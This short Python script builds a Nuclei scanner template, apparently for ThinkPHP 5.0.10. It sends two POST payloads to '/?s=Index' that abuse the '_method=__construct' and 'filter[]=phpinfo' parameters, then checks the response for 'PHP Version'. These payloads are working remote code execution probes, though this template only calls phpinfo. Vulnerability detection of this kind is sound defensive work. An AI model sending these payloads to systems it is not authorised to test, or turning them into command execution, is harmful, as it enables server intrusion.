from nuclei import BaseHTTP,Template
http = BaseHTTP(method="POST")
http.set_path(
    "{{BaseURL}}/?s=Index"
)
http.set_body(
    body="_method=__construct&method=get&filter[]=phpinfo&get[]=-1"
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)

http2 = BaseHTTP(method="POST")
http2.set_path(
    "{{BaseURL}}/?s=Index"
)
http2.set_body(
    body="s=-1&_method=__construct&method=get&filter[]=phpinfo"
)
http2.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
t = Template(
    id="tp5010"
)
t.set_http(http=http)
t.set_http(http=http2)
t.dump()